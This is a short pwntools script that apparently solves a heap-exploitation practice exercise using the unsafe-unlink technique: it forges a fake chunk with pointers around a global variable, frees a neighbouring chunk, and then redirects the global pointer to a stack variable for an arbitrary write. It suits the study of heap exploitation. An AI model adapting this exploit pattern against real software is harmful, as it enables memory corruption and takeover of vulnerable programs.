from pwn import *
from handle import *

def exploit():
	malloc(0x80)
	A = chunk_info(0)
	write_pointer_to_global_ptr(p64(A[0]))

	malloc(0x80)

	ptr = global_ptr_address()
	write_to_chunk(0, '\x00' * 0x10 + p64(ptr - 0x18) + p64(ptr - 0x10) + '\x00' * 0x60 + p64(0x80) + p64(0x90))

	free_chunk(1)

	target = stack_var_1_address()
	write_data_to_global_ptr('A' * 0x18 + p64(target))

p = exec_file(1)
exploit()
p.interactive()
p.close()
